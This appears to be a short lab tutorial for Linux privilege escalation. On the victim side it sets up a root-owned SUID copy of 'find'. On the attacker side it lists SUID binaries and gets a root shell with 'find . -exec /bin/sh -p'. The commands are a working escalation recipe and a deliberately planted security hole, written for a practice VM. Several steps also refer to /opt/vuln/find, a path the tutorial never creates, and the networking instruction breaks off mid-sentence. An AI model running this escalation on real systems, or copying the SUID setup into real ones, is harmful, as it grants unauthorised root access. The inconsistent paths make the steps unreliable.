## PREREQUISITE

- Kali Linux VM as Victim machine
- Another VM OR your host Linux machine (like Manjaro Linux) as Attacker machine
- In Oracle VM VirtualBox set victim networking to:


#### On the Victim machine - DO THIS

sudo useradd -m hacker_suid

sudo passwd hacker_suid

cat /etc/passwd | grep hacker_suid

sudo mkdir /opt/vuln_suid

ls -ld /opt/vuln_suid

sudo cp /usr/bin/find /opt/vuln_suid/find

ls -l /opt/vuln_suid

sudo chown root:root /opt/vuln/find

ls -l /opt/vuln/find

sudo chmod u+s /opt/vuln_suid/find

ls -l /opt/vuln/find

#### On the Attacker machine - DO THIS

ssh hacker_suid@IP

find / -perm -4000 2>/dev/null

Go to [GTFOBins](https://gtfobins.org/)

/opt/vuln_suid/find . -exec /bin/sh -p \; -quit

